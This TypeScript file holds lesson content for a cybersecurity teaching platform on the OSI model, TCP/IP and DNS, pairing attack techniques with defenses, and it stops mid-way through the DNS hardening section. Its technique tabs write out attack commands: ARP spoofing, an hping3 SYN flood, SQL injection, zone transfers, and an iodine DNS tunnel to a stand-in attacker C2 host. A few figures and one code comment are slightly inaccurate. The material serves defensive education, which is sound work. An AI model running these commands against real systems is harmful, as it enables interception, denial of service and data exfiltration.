/**
 * Full lesson content for all CyberEd modules.
 * Each key is a lesson slug. Values have tabs: concept, technique, defense.
 * Content is HTML — rendered inside the prose ContentRenderer in LessonPage.
 */

interface LessonContentData {
  concept?: string
  technique?: string
  defense?: string
}

export const LESSON_CONTENT: Record<string, LessonContentData> = {

  // ══════════════════════════════════════════════════════════════════════════
  // LEVEL 0 — FUNDAMENTALS
  // ══════════════════════════════════════════════════════════════════════════

  'osi-model': {
    concept: `
<h2>What is the OSI Model?</h2>
<p>
  Imagine building a skyscraper. You don't just dump steel and glass on the ground and
  hope for the best — you break the problem into layers: foundation, frame, floors,
  walls, plumbing, electrical, finishing. Each layer has a specific job and only needs
  to talk to the layer directly above and below it.
</p>
<p>
  The <strong>OSI Model</strong> (Open Systems Interconnection) applies the same thinking
  to computer networking. It defines 7 layers, each responsible for one specific aspect
  of moving data from one computer to another.
</p>

<blockquote>
  "Please Do Not Throw Sausage Pizza Away" — mnemonic for layers 1-7 (Physical,
  Data Link, Network, Transport, Session, Presentation, Application)
</blockquote>

<h3>The 7 Layers — Bottom Up</h3>

<p><strong>Layer 1 — Physical</strong></p>
<p>
  Raw bits (1s and 0s) over physical media: copper cables, fiber optic, radio waves.
  Devices: network cables, switches at the hardware level, WiFi radios.
  <em>Analogy: the actual road that trucks drive on.</em>
</p>

<p><strong>Layer 2 — Data Link</strong></p>
<p>
  Packages bits into <strong>frames</strong> and handles delivery on a local network
  using <strong>MAC addresses</strong> (hardware addresses burned into every NIC).
  Devices: switches, network interface cards.
  <em>Analogy: street addresses within a neighborhood.</em>
</p>
<pre><code>MAC address example: 00:1A:2B:3C:4D:5E
Format: 6 pairs of hex digits, unique per device globally</code></pre>

<p><strong>Layer 3 — Network</strong></p>
<p>
  Routes <strong>packets</strong> across multiple networks using <strong>IP addresses</strong>.
  This is where the internet lives. Devices: routers.
  <em>Analogy: ZIP codes — routing mail across cities.</em>
</p>
<pre><code>IPv4: 192.168.1.100   (32-bit, ~4 billion addresses)
IPv6: 2001:db8::1     (128-bit, essentially unlimited)</code></pre>

<p><strong>Layer 4 — Transport</strong></p>
<p>
  Manages end-to-end communication between applications using <strong>ports</strong>.
  Two key protocols:
</p>
<ul>
  <li><strong>TCP</strong> — reliable, ordered, connection-oriented (like certified mail)</li>
  <li><strong>UDP</strong> — fast, connectionless, no guarantee (like a postcard)</li>
</ul>
<pre><code>SSH:   TCP port 22    |  HTTP:  TCP port 80
HTTPS: TCP port 443   |  DNS:   UDP port 53
RDP:   TCP port 3389  |  NTP:   UDP port 123</code></pre>

<p><strong>Layer 5 — Session</strong></p>
<p>
  Manages conversations (sessions) between applications: establishing, maintaining,
  terminating. Handles things like "who goes first?" in communication.
  <em>Analogy: a phone call setup and teardown.</em>
</p>

<p><strong>Layer 6 — Presentation</strong></p>
<p>
  Translates data formats: encryption/decryption (TLS), compression (gzip),
  character encoding (UTF-8). The "translator" layer.
  <em>Analogy: a human translator between two people speaking different languages.</em>
</p>

<p><strong>Layer 7 — Application</strong></p>
<p>
  The layer you interact with directly: HTTP, HTTPS, DNS, SMTP, FTP.
  Applications talk to the network through this layer.
  <em>Analogy: the actual conversation content — what you say, not how you say it.</em>
</p>

<h3>Encapsulation — How Data Travels Down</h3>
<p>
  When you send data, each layer <strong>wraps it in a new envelope</strong> (adds a header)
  before passing it down. By Layer 1, your "Hello" message is buried inside:
</p>
<pre><code>[Ethernet Header | IP Header | TCP Header | HTTP Header | "Hello" | Ethernet Trailer]
   (Layer 2)        (Layer 3)   (Layer 4)    (Layer 7)              (Layer 2)</code></pre>
<p>The receiver unwraps each layer, reading headers relevant to their layer.</p>
`,
    technique: `
<h2>How Attackers Exploit Each OSI Layer</h2>
<p>
  Every layer of the OSI model has its own class of attacks. Understanding which layer
  an attack targets tells you immediately what defenses apply.
</p>

<h3>Layer 1 — Physical Attacks</h3>
<ul>
  <li><strong>Cable tapping</strong> — physically intercepting copper or fiber</li>
  <li><strong>Rogue access points</strong> — plugging in an evil WiFi AP</li>
  <li><strong>Destruction</strong> — cutting cables (rare in cyber, common in sabotage)</li>
</ul>
<pre><code>MITRE T1200: Hardware Additions
Real example: NSA COTTONMOUTH — USB implants that tap data from air-gapped systems</code></pre>

<h3>Layer 2 — Data Link Attacks</h3>
<ul>
  <li><strong>ARP spoofing</strong> — faking MAC-to-IP mappings to intercept traffic</li>
  <li><strong>MAC flooding</strong> — overwhelming switch CAM tables to force broadcast mode</li>
  <li><strong>VLAN hopping</strong> — exploiting trunk port configs to jump VLANs</li>
</ul>
<pre><code># ARP spoofing with arpspoof (for educational lab use only)
arpspoof -i eth0 -t 192.168.1.1 192.168.1.100
# Tells the router: "I am 192.168.1.100" (lies)
# Now router sends victim traffic to attacker → MITM</code></pre>

<h3>Layer 3 — Network Attacks</h3>
<ul>
  <li><strong>IP spoofing</strong> — forging source IP addresses</li>
  <li><strong>ICMP flood</strong> — ping of death, smurf attacks</li>
  <li><strong>BGP hijacking</strong> — poisoning routing tables (used by nation-states)</li>
</ul>
<pre><code>Real example: China Telecom BGP hijacking (2010)
Rerouted 15% of internet traffic including US military through Chinese routers
for 18 minutes — complete traffic interception opportunity</code></pre>

<h3>Layer 4 — Transport Attacks</h3>
<ul>
  <li><strong>SYN flood</strong> — half-open connections exhaust server state tables</li>
  <li><strong>Port scanning</strong> — nmap probes every port to map attack surface</li>
  <li><strong>Session hijacking</strong> — predicting TCP sequence numbers</li>
</ul>
<pre><code># SYN flood (for authorized lab testing only)
hping3 -S --flood -V -p 80 target.com
# Sends thousands of SYN packets, never completing the handshake</code></pre>

<h3>Layer 7 — Application Attacks (Most Common)</h3>
<ul>
  <li><strong>SQL Injection</strong> — malicious SQL in form fields</li>
  <li><strong>XSS</strong> — injecting JavaScript into web pages</li>
  <li><strong>API abuse</strong> — sending unexpected inputs to REST APIs</li>
  <li><strong>HTTP request smuggling</strong> — exploiting frontend/backend parsing differences</li>
</ul>
<pre><code># SQL Injection example (educational)
Normal login:  SELECT * FROM users WHERE user='admin' AND pass='secret'
Injected:      SELECT * FROM users WHERE user='admin'--' AND pass=''
Result: -- comments out the password check → login bypass</code></pre>
`,
    defense: `
<h2>Defending Each OSI Layer</h2>

<h3>Layer 1-2: Physical & Data Link</h3>
<ul>
  <li>Enable <strong>802.1X port authentication</strong> — only authorized devices connect</li>
  <li>Enable <strong>Dynamic ARP Inspection (DAI)</strong> on managed switches</li>
  <li>Disable unused switch ports and VLAN 1</li>
  <li>Physical security: locked server rooms, cable management, port covers</li>
</ul>
<pre><code># Cisco: Enable Dynamic ARP Inspection
ip dhcp snooping
ip dhcp snooping vlan 10,20
ip arp inspection vlan 10,20</code></pre>

<h3>Layer 3: Network</h3>
<ul>
  <li>Implement <strong>ingress/egress filtering</strong> (BCP 38) — drop spoofed source IPs</li>
  <li>Use <strong>RPKI</strong> for BGP route origin validation</li>
  <li>Segment networks into VLANs — finance, HR, IT, guest all separate</li>
  <li>Default-deny firewall rules between segments</li>
</ul>

<h3>Layer 4: Transport</h3>
<ul>
  <li>Rate-limit SYN connections per source IP (syn cookies)</li>
  <li>Close all ports not explicitly needed (<code>nmap</code> yourself to verify)</li>
  <li>Use TCP SYN cookies to handle SYN floods</li>
</ul>
<pre><code># Linux: Enable SYN cookies
sysctl -w net.ipv4.tcp_syncookies=1
echo "net.ipv4.tcp_syncookies = 1" >> /etc/sysctl.conf</code></pre>

<h3>Layer 7: Application</h3>
<ul>
  <li>Deploy a <strong>Web Application Firewall (WAF)</strong></li>
  <li>Use parameterized queries — never build SQL strings with user input</li>
  <li>Implement <strong>Content Security Policy (CSP)</strong> headers against XSS</li>
  <li>Rate-limit APIs and enforce input validation</li>
  <li>Regular penetration testing of web applications</li>
</ul>
<pre><code>// Safe parameterized query (Python)
cursor.execute("SELECT * FROM users WHERE user=? AND pass=?", (username, password))
// vs dangerous string concatenation:
cursor.execute(f"SELECT * FROM users WHERE user='{username}' AND pass='{password}'")</code></pre>
`,
  },

  // ─────────────────────────────────────────────────────────────────────────

  'tcp-ip': {
    concept: `
<h2>TCP/IP — How Computers Talk to Each Other</h2>
<p>
  TCP/IP is the foundation of the internet. Every web page you load, every message you
  send, every video you stream relies on it. Understanding TCP/IP is like learning the
  grammar of the internet's language.
</p>

<h3>The Analogy: Certified Mail</h3>
<p>
  Imagine you need to send a 1,000-page manuscript across the country, but the post
  office only accepts packages up to 10 pages. Here's what happens:
</p>
<ol>
  <li>You split the manuscript into 100 packages (10 pages each)</li>
  <li>You number each package: 1 of 100, 2 of 100, etc.</li>
  <li>You send them all — they may arrive out of order via different routes</li>
  <li>The recipient reassembles them in order using your numbers</li>
  <li>The recipient confirms each package received and asks for re-sends if any are missing</li>
</ol>
<p>That's exactly what TCP does with data. The "packages" are called <strong>segments</strong>.</p>

<h3>The Three-Way Handshake</h3>
<p>
  Before TCP sends any data, it must establish a connection. Think of it as a formal
  "are you ready?" exchange before starting a conversation:
</p>
<pre><code>Client                    Server
  |                          |
  |-------- SYN ------------>|   "I want to connect. My sequence starts at 1000."
  |                          |
  |<------- SYN-ACK ---------|   "Got it. Ready. My sequence starts at 5000. Expecting 1001 from you."
  |                          |
  |-------- ACK ------------>|   "Confirmed. Expecting 5001 from you. Let's go."
  |                          |
  |=== CONNECTION OPEN =======|</code></pre>

<h3>TCP Flags — The Control Signals</h3>
<p>Each TCP packet carries flags that tell the receiver what kind of message it is:</p>
<pre><code>SYN  (Synchronize)  — Initiates a connection
ACK  (Acknowledge)  — Confirms received data
FIN  (Finish)       — Requests connection close
RST  (Reset)        — Abruptly terminates connection
PSH  (Push)         — Send data to application immediately
URG  (Urgent)       — High-priority data</code></pre>

<h3>Why Sequence Numbers Matter for Security</h3>
<p>
  TCP sequence numbers were historically predictable — attackers could guess the next
  number and inject data into a connection without being part of it.
  This is called <strong>TCP session hijacking</strong>.
</p>
<p>Modern OS's use cryptographically random initial sequence numbers to prevent this.</p>

<h3>UDP — The Faster, Unreliable Alternative</h3>
<p>
  UDP skips the handshake and reliability guarantees. No acknowledgments, no re-sends,
  no ordering. Just fire-and-forget packets.
</p>
<p><strong>When to use UDP:</strong> video streaming, DNS lookups, online gaming, VoIP.
Speed matters more than perfect delivery.</p>
<pre><code>Protocol comparison:
                TCP           UDP
Connection      Required      None
Reliability     Guaranteed    Not guaranteed
Ordering        In-order      Any order
Speed           Slower        Faster
Use case        HTTP, SSH      DNS, video, gaming</code></pre>
`,
    technique: `
<h2>TCP/IP Attacks Used by Real Attackers</h2>

<h3>SYN Flood — Exhausting Server State</h3>
<p>
  During the handshake, a server holds a "half-open" connection in memory while waiting
  for the client's final ACK. A SYN flood sends thousands of SYN packets with fake
  source IPs — the server allocates memory for each, ACKs to nowhere, and fills up
  its connection table. Legitimate connections are refused.
</p>
<pre><code>Normal: Server handles ~65,000 concurrent connections
Under SYN flood: All slots filled with fake half-open connections
Result: Denial of Service — real users cannot connect

Mirai botnet used SYN floods hitting 620 Gbps (Dyn DNS, 2016)
Half the internet went down: Twitter, Netflix, Reddit, GitHub</code></pre>

<h3>Port Scanning — Mapping the Attack Surface</h3>
<p>
  Before exploiting anything, attackers use TCP flags to probe which ports are open.
  nmap's SYN scan (the default) works like this:
</p>
<pre><code>SYN Scan workflow:
  Attacker → SYN → Port 22
  Server   → SYN-ACK → "Port 22 is OPEN"
  Attacker → RST → (never completes handshake — stays "stealthy")

  Attacker → SYN → Port 23
  Server   → RST → "Port 23 is CLOSED"

  Attacker → SYN → Port 8080
  [silence] → "Port 8080 is FILTERED (firewall)"</code></pre>

<h3>TCP Session Hijacking</h3>
<p>
  If an attacker can sniff traffic (via ARP spoofing or compromised router), they can
  observe TCP sequence numbers and inject packets that appear to come from a legitimate
  client — hijacking their active session.
</p>
<pre><code>Salt Typhoon context:
After compromising Cisco routers at telecom providers, the attackers
had full visibility into TCP sessions traversing those routers —
including law enforcement's lawful intercept requests.</code></pre>

<h3>TCP Reset Attack</h3>
<p>
  By sending a RST packet with the correct sequence number to either side of a
  TCP connection, an attacker can forcibly terminate an active connection.
  China's Great Firewall uses TCP RST injection to block connections to censored sites.
</p>
`,
    defense: `
<h2>Defending Against TCP/IP Attacks</h2>

<h3>SYN Flood Defense</h3>
<pre><code># Linux kernel SYN cookie protection
sysctl -w net.ipv4.tcp_syncookies=1

# Reduce SYN-ACK retries
sysctl -w net.ipv4.tcp_synack_retries=2

# Limit SYN backlog
sysctl -w net.ipv4.tcp_max_syn_backlog=4096

# Rate-limit SYN packets per source IP (iptables)
iptables -A INPUT -p tcp --syn -m limit --limit 1/s --limit-burst 3 -j ACCEPT
iptables -A INPUT -p tcp --syn -j DROP</code></pre>

<h3>Port Scan Detection</h3>
<pre><code># Snort rule: detect nmap SYN scan
alert tcp any any -> $HOME_NET any (
  flags: S;
  msg: "Possible SYN Scan";
  threshold: type both, track by_src, count 20, seconds 2;
  sid: 1001;
)

# Block port scanners with iptables (after 15 new connections in 5s)
iptables -A INPUT -p tcp --tcp-flags ALL SYN -m recent --name portscan --set
iptables -A INPUT -p tcp --tcp-flags ALL SYN -m recent --name portscan \
  --rcheck --seconds 5 --hitcount 15 -j DROP</code></pre>

<h3>Network Monitoring Best Practices</h3>
<ul>
  <li>Log all TCP connection attempts at your perimeter (NetFlow/IPFIX)</li>
  <li>Alert on high rate of RST packets from internal hosts (could indicate scan tools)</li>
  <li>Alert on connections to unusual destination ports from workstations</li>
  <li>Use <strong>fail2ban</strong> to auto-block IPs after repeated connection failures</li>
  <li>Implement <strong>network baseline</strong> — alert on traffic 3x above normal</li>
</ul>
`,
  },

  // ─────────────────────────────────────────────────────────────────────────

  'dns': {
    concept: `
<h2>The Domain Name System: From HOSTS.TXT to Global Infrastructure</h2>

<h3>The World Before DNS — HOSTS.TXT and Its Breaking Point</h3>
<p>
  In the early days of the ARPANET, every computer on the network maintained a single
  text file called <strong>HOSTS.TXT</strong>, managed by the Stanford Research Institute
  Network Information Center (SRI-NIC). This file mapped every known hostname to its
  IP address. By 1982 the ARPANET was growing explosively, and by 1983 the master
  HOSTS.TXT file had ballooned to nearly <strong>2 megabytes</strong>. Every time a new
  machine was added, the SRI-NIC had to be contacted manually. Name collisions were
  constant. The file was always out of date by the time sites downloaded it. Update
  traffic was beginning to choke the network itself.
</p>
<p>
  The Internet needed something fundamentally different: a distributed, hierarchical,
  automatically replicated database that could scale to millions or billions of entries
  without any central coordination bottleneck.
</p>

<h3>Paul Mockapetris and the Invention of DNS (1983)</h3>
<p>
  In November 1983, Paul Mockapetris published <strong>RFC 882</strong> and
  <strong>RFC 883</strong>, describing the Domain Name System. The key insight was
  <strong>delegation</strong>: the root would delegate .com to Verisign, Verisign would
  delegate google.com to Google, Google would delegate mail.google.com internally.
  Each level only needed to know about the next level down in its own subtree.
  The system scaled to billions of domains because no single server ever held the
  whole picture. Today's DNS (RFC 1034/1035, revised 1987) implements these exact
  principles. Every time you visit a website, you rely on infrastructure Mockapetris
  designed over forty years ago.
</p>

<h3>The DNS Hierarchy — A Tree of Delegation</h3>
<p>
  The DNS namespace is organized as an inverted tree. At the very top is the
  <strong>root zone</strong> (represented by a single dot). Below it are
  <strong>Top-Level Domains</strong>, then second-level domains, then subdomains.
</p>
<pre><code>                        . (root)
                       /    \
                    .com    .org    .io    .gov    .uk ...
                   /   \
           google.com  github.com  amazon.com ...
               |
          mail.google.com   maps.google.com   ...</code></pre>

<h4>Root Servers</h4>
<p>
  The root zone is served by <strong>13 named root server clusters</strong>, labeled A through M.
  These are not 13 physical machines — using <strong>IP anycast</strong>, each letter-name
  resolves to hundreds of physical servers distributed worldwide. As of 2025 there are over
  1,800 root server instances globally, operated by 12 organizations including Verisign
  (A and J), ICANN (L), NASA Ames Research Center (G), the US Army Research Lab (H),
  the University of Maryland (D), Internet Systems Consortium (F), and RIPE NCC (K).
  Root servers do not know where google.com is — they only know which TLD servers are
  responsible for .com, .org, .io, and every other TLD.
</p>

<h3>Step-by-Step DNS Resolution — Every Hop</h3>
<pre><code>Step 1: Browser DNS Cache
  If github.com was visited recently and TTL has not expired: done.

Step 2: Operating System Cache
  OS checks its resolver cache. If found and not expired: done.

Step 3: /etc/hosts (or C:\Windows\System32\drivers\etc\hosts)
  OS checks the local hosts file. If an entry exists: use it (overrides DNS entirely).

Step 4: Recursive Resolver
  OS sends a query to the configured recursive resolver (your router, ISP, or 1.1.1.1).
  If the resolver has a cached answer: return it. Otherwise, begin iterative resolution.

Step 5: Resolver Queries Root Server
  "Who handles .com?"
  Root replies: "Try the .com TLD servers at a.gtld-servers.net"

Step 6: Resolver Queries .com TLD Server
  "Who handles github.com?"
  TLD replies: "ns1.p16.dynect.net and ns2.p16.dynect.net"

Step 7: Resolver Queries GitHub's Authoritative Nameserver
  "What is the A record for github.com?"
  Auth replies: "140.82.114.4, TTL 3600"

Step 8: Caching and Response
  Resolver caches the answer for 3600 seconds.
  Browser connects to 140.82.114.4 on port 443.</code></pre>

<blockquote>
  The entire iterative resolution chain from Step 5 through Step 7 typically completes in
  20–100 milliseconds. Your client only makes one query; the recursive resolver makes many
  — hence the name.
</blockquote>

<h3>Every DNS Record Type — The Complete Reference</h3>

<h4>A and AAAA Records — Address Mapping</h4>
<pre><code>github.com.   3600  IN  A     140.82.114.4          (IPv4 — 32-bit)
cloudflare.com. 300 IN  AAAA  2606:4700::6810:84e5  (IPv6 — 128-bit)</code></pre>
<p>A single hostname can have multiple A records for load balancing or redundancy.</p>

<h4>MX Record — Mail Exchanger</h4>
<pre><code>google.com.  3600  IN  MX  10  aspmx.l.google.com.
google.com.  3600  IN  MX  20  alt1.aspmx.l.google.com.
google.com.  3600  IN  MX  30  alt2.aspmx.l.google.com.</code></pre>
<p>
  The number is <strong>priority</strong> — lower means higher priority. Mail delivery
  tries the lowest value first. MX records must point to hostnames, never IP addresses.
</p>

<h4>CNAME — Canonical Name (Alias)</h4>
<pre><code>www.github.com.  3600  IN  CNAME  github.com.</code></pre>
<p>
  Critical limitation: <strong>you cannot CNAME the zone apex</strong>. You cannot CNAME
  example.com itself because the zone apex must have SOA and NS records, which cannot
  coexist with a CNAME per RFC 1034. This is why CDNs like Cloudflare invented
  "CNAME flattening" — resolving the CNAME chain at the authoritative nameserver and
  returning A records directly.
</p>

<h4>NS Record — Name Server</h4>
<pre><code>github.com.  172800  IN  NS  ns1.p16.dynect.net.
github.com.  172800  IN  NS  ns2.p16.dynect.net.</code></pre>
<p>Delegates authority for a zone. Note the 48-hour TTL — NS records change rarely.</p>

<h4>SOA Record — Start of Authority</h4>
<pre><code>github.com.  3600  IN  SOA  ns1.p16.dynect.net. hostmaster.github.com. (
    2024011501  ; SERIAL: version (YYYYMMDDNN) — increment on every change
    3600        ; REFRESH: secondary polls primary every hour
    900         ; RETRY: retry failed refresh after 15 minutes
    604800      ; EXPIRE: secondary serves cached data for up to 7 days
    300         ; NEGATIVE TTL: cache NXDOMAIN for 5 minutes
)</code></pre>

<h4>TXT Records — Email Authentication and Verification</h4>
<pre><code>; SPF — which servers may send email for this domain
acme.com.  IN  TXT  "v=spf1 include:_spf.google.com ~all"

; DKIM — public key for email signature verification
selector._domainkey.acme.com.  IN  TXT  "v=DKIM1; k=rsa; p=MIGfMA0GC..."

; DMARC — policy for unauthenticated email
_dmarc.acme.com.  IN  TXT  "v=DMARC1; p=reject; rua=mailto:dmarc@acme.com"</code></pre>

<h4>PTR — Reverse DNS</h4>
<pre><code>4.114.82.140.in-addr.arpa.  3600  IN  PTR  lb-140-82-114-4-fra.github.com.</code></pre>
<p>
  The IP is reversed and appended to in-addr.arpa. Critical for email deliverability
  — mail servers verify that your sending IP has a matching PTR record.
</p>

<h4>SRV Record — Service Location</h4>
<pre><code>_sip._tcp.acme.com.  3600  IN  SRV  10  20  5060  sipserver.acme.com.
;                                   prio  wt  port  target</code></pre>
<p>Used by SIP, XMPP, and other protocols to discover service endpoints dynamically.</p>

<h4>CAA — Certificate Authority Authorization</h4>
<pre><code>acme.com.  3600  IN  CAA  0  issue "letsencrypt.org"
acme.com.  3600  IN  CAA  0  issuewild ";"
acme.com.  3600  IN  CAA  0  iodef "mailto:security@acme.com"</code></pre>
<p>
  Specifies which CAs may issue certificates for your domain. Prevents unauthorized
  issuance by rogue CAs. The issuewild tag controls wildcard certificates separately.
</p>

<h4>DNSSEC Records — DNSKEY, DS, RRSIG</h4>
<pre><code>; DNSKEY — zone's public signing key
acme.com.  3600  IN  DNSKEY  256 3 13 oJMRESz5E4gYzS...

; DS — delegation signer in parent zone (links parent to child DNSKEY)
acme.com.  3600  IN  DS  2371 13 2 1F987CC...

; RRSIG — cryptographic signature over an RRset
acme.com.  3600  IN  RRSIG  A 13 2 3600 20240201 20240101 12345 acme.com. abc...</code></pre>
<p>
  DNSSEC adds a chain of cryptographic signatures from the root zone down to every
  signed leaf record, making forged DNS responses cryptographically verifiable.
</p>

<h3>DNS Caching, TTL, and Security Implications</h3>
<ul>
  <li><strong>Very low TTL (60s or less)</strong>: C2 operators rotate infrastructure IPs
  faster than defenders can blocklist. Emotet rotated C2 every 60 seconds.</li>
  <li><strong>Very high TTL (days)</strong>: Performance wins, but emergency IP changes
  (DDoS migration, incident response) can take days to propagate worldwide.</li>
  <li><strong>Negative caching</strong>: NXDOMAIN responses are cached for the SOA minimum
  TTL, preventing repeated queries for non-existent names.</li>
</ul>

<h3>Split-Horizon DNS</h3>
<p>
  Many organizations run <strong>split-horizon DNS</strong>: the same domain resolves
  differently depending on whether you query from inside or outside the corporate network.
  Internal users get <code>192.168.1.100</code> for <em>crm.acme.com</em>; the same query
  from the internet returns NXDOMAIN (the CRM is not internet-facing). This reduces attack
  surface — internal services are not discoverable via external DNS.
</p>

<h3>DNS over HTTPS (DoH) and DNS over TLS (DoT)</h3>
<p>
  Traditional DNS runs over UDP port 53 in complete plaintext. Your ISP, network
  administrators, and any passive tap can see every domain you query.
</p>
<ul>
  <li><strong>DNS over TLS (DoT)</strong>: Wraps DNS inside TLS on TCP port 853.
  Easy for firewalls to identify — dedicated port.</li>
  <li><strong>DNS over HTTPS (DoH)</strong>: DNS queries inside HTTPS on port 443.
  Indistinguishable from regular web traffic. Firefox and Chrome ship with DoH enabled
  by default to Cloudflare or Google, bypassing corporate resolvers.</li>
</ul>
<blockquote>
  DoH creates a fundamental enterprise monitoring problem. When endpoints bypass the
  corporate DNS resolver, the organization loses DNS logging, RPZ blocking, and detection
  of DNS-based C2 and exfiltration. Defenders must either block DoH at the firewall or
  enroll in a managed DoH service that provides logging.
</blockquote>
`,
    technique: `
<h2>How Attackers Weaponize DNS</h2>

<h3>Zone Transfer (AXFR) — The Reconnaissance Goldmine</h3>
<p>
  DNS zone transfers are a legitimate replication mechanism by which secondary nameservers
  copy the complete zone from a primary. The catastrophic misconfiguration is allowing
  <strong>any host on the internet</strong> to request a transfer — not just authorized
  secondaries. The BIND9 default configuration prior to version 9.x permitted this.
  A 2023 study found approximately <strong>4.7% of nameservers</strong> still respond
  to AXFR requests from arbitrary sources.
</p>
<pre><code># Step 1: Find the authoritative nameservers
dig NS acme.com
; acme.com.  172800  IN  NS  ns1.acme.com.
; acme.com.  172800  IN  NS  ns2.acme.com.

# Step 2: Attempt zone transfer from each NS
dig AXFR acme.com @ns1.acme.com

# If misconfigured, the response is the ENTIRE zone:
; acme.com.          IN  SOA   ns1.acme.com. hostmaster.acme.com. ...
; mail.acme.com.     IN  A     203.0.113.25     (mail server)
; vpn.acme.com.      IN  A     203.0.113.30     (VPN gateway — prime target)
; dev.acme.com.      IN  A     10.0.0.50        (dev on RFC1918 space!)
; internal.acme.com. IN  A     10.0.0.100       (internal system)
; db.acme.com.       IN  A     10.0.0.200       (database server)
; jenkins.acme.com.  IN  A     203.0.113.50     (CI/CD pipeline)
; admin.acme.com.    IN  A     203.0.113.55     (admin panel)

# Complete infrastructure map delivered in one unauthenticated query.</code></pre>

<h3>Subdomain Enumeration — Beyond Zone Transfers</h3>
<p>
  When zone transfers are blocked, attackers use multiple complementary techniques:
</p>
<ul>
  <li><strong>Certificate Transparency</strong>: Every TLS certificate must be logged to
  public CT logs. Query <code>crt.sh/?q=%.acme.com</code> — entirely passive, zero
  packets to the target.</li>
  <li><strong>DNS brute force</strong>: Tools like gobuster, amass, and subfinder try thousands
  of common subdomain prefixes. A good wordlist typically finds 20–50% of subdomains.</li>
  <li><strong>Passive DNS databases</strong>: SecurityTrails, DNSDB, and VirusTotal maintain
  historical records of DNS resolutions observed across millions of resolvers globally.</li>
  <li><strong>Reverse IP lookup</strong>: Find all domains sharing an IP address on shared
  hosting — neighbors may share vulnerabilities.</li>
</ul>

<h3>The Kaminsky Attack — DNS Cache Poisoning (2008)</h3>
<p>
  In 2008, Dan Kaminsky discovered a critical DNS vulnerability so severe it triggered the
  most coordinated emergency patch event in internet history — every major DNS resolver
  vendor released patches simultaneously on a single coordinated day.
</p>
<p>
  DNS query responses are matched using a 16-bit <strong>transaction ID</strong> (0–65,535).
  The Kaminsky insight: rather than poisoning a single A record (hard to hit), poison the
  <em>NS record</em> for the entire zone. By repeatedly querying for <em>random.acme.com</em>
  (nonexistent names the resolver must look up), and simultaneously flooding forged responses
  claiming "the NS for acme.com is evil.attacker.com", an attacker generates thousands of
  transaction ID guessing attempts per second.
</p>
<pre><code># Kaminsky attack (conceptual representation):
# 1. Attacker sends: dig randomXXXXX.acme.com @victim-resolver
# 2. Resolver generates outbound query with transaction ID = RANDOM
# 3. Attacker floods: forged UDP responses claiming NS for acme.com = evil.attacker.com
#    Trying all 65,536 possible transaction IDs each second
# 4. When the correct ID is guessed: resolver caches evil.attacker.com as the NS
# 5. Now ALL queries for *.acme.com go to attacker's server

# The fix: source port randomization
# Before: DNS queries always sent from port 53 (16-bit TxID only)
# After: random source port 1024-65535 + 16-bit TxID = ~32 bits of entropy
# Complete fix: DNSSEC (signed records cannot be forged regardless)</code></pre>

<h3>DNS Tunneling — Covert C2 and Data Exfiltration</h3>
<p>
  Corporate firewalls rigorously control outbound traffic but almost never block outbound
  UDP port 53 — DNS must work for internet access. This makes DNS the ideal covert channel
  for data exfiltration and command-and-control.
</p>
<pre><code># Principle: encode data in DNS query subdomain labels
# Attacker controls the authoritative NS for attacker-c2.com
# Any DNS query for any subdomain is logged at the attacker's server

# Tool: iodine — creates an IP tunnel over DNS
# Victim side:
iodine -f attacker-c2.com
# Encodes IP packets as DNS queries:
# "aGVsbG8.attacker-c2.com" (base32-encoded data chunks)
# Each query: ~100 bytes; each response: ~200 bytes
# Effective throughput: ~1 KB/sec (slow but enough for reverse shell)

# Tool: dnscat2 — encrypted C2 channel inside DNS
# Supports shell sessions, file transfer, port forwarding
# All traffic looks like DNS queries to a seemingly legitimate domain

# Detection indicators:
# - Queries to single domain at rate of hundreds per minute
# - Subdomain labels longer than 50 characters
# - High-entropy base32/base64 patterns in subdomain labels
# - TXT and NULL record type queries from endpoints (unusual)
# - NXDOMAIN rate spike (DGA scanning behavior)</code></pre>

<h3>Fast-Flux DNS — Protecting Botnet C2 Infrastructure</h3>
<p>
  Fast-flux DNS rotates IP addresses so rapidly that blocklisting is futile.
</p>
<ul>
  <li><strong>Single-flux</strong>: The C2 domain has dozens of A records, each pointing to
  a different bot acting as a proxy. TTL is 60 seconds. Every minute the A record set rotates
  to fresh IPs. Blocklisting any individual IP only works for 60 seconds. The real C2 server
  is hidden behind rotating proxies.</li>
  <li><strong>Double-flux</strong>: Both the A records <em>and</em> the NS records rotate.
  The nameservers themselves are part of the botnet, changing every minute. Even seizing NS
  records does not kill the domain.</li>
</ul>
<pre><code>MITRE ATT&CK: T1568.001 — Fast Flux DNS

Real examples:
- Storm botnet (2007): pioneered fast-flux at scale
- Conficker (2009): combined DGA with fast-flux for near-indestructible C2
- Modern ransomware affiliates: bulletproof hosters with fast-flux infrastructure</code></pre>

<h3>DNS Amplification DDoS</h3>
<p>
  DNS amplification exploits two properties: UDP source IPs are trivially spoofed,
  and DNS responses can be vastly larger than queries.
</p>
<pre><code># Attack anatomy:
# Attacker sends query with victim's IP as source (UDP spoofing)
# Query: "ANY isc.org" — ~60 bytes
# Response: ~3,000 bytes — 50x amplification factor

# At scale:
# Attacker botnet sends 1 Gbps of query traffic
# DNS resolvers amplify to 50 Gbps hitting the victim
# Victim's upstream link saturated

# 2013 Spamhaus DDoS: 300 Gbps — largest recorded at the time
# Used open DNS resolvers worldwide as amplifiers
# Targeted Spamhaus (anti-spam org) via CloudFlare's infrastructure

# Open resolver check:
dig +short test.openresolver.com TXT @your-resolver-ip
# "open-resolver-confirmed" = your resolver will amplify for anyone</code></pre>
`,
    defense: `
<h2>Hardening DNS — Comprehensive Defense</h2>

<h3>Blocking Unauthorized Zone Transfers</h3>
<pre><code># BIND9 — named.conf.local
zone "acme.com" {
    type master;
    file "/etc/bind/zones/acme.com.zone";
    # ONLY allow transfers to designated secondary nameservers:
    allow-transfer { 203.0.113.252; 203.0.113.253; };
    # NEVER: allow-transfer { any; };
};

# Verify from an external host:
dig AXFR acme.com @ns1.acme.com
# Expected: "Transfer failed." or connection refused

# Windows DNS Server (PowerShell):
Set-DnsServerPrimaryZone -Name "acme.com" \`
    -SecondaryServers "203.0.113.252","203.0.113.253" \`
    -SecureSecondaries TransferToSecureServers</code></pre>

<h3>DNSSEC — Cryptographic Authentication</h3>
<p>
  DNSSEC adds a chain of cryptographic signatures from the root zone down to every signed
  record. A validating resolver follows: root key, then .com DS, then acme.com DNSKEY,
  then the RRSIG over the A record — making forged responses cryptographically impossible
  to inject into resolvers' caches.
</p>
<pre><code># Enable DNSSEC validation on BIND9 recursive resolver:
options {
    dnssec-validation auto;  # Use built-in root trust anchors
};

# Check DNSSEC status:
dig +dnssec cloudflare.com A
# Look for "ad" flag in header (Authenticated Data)
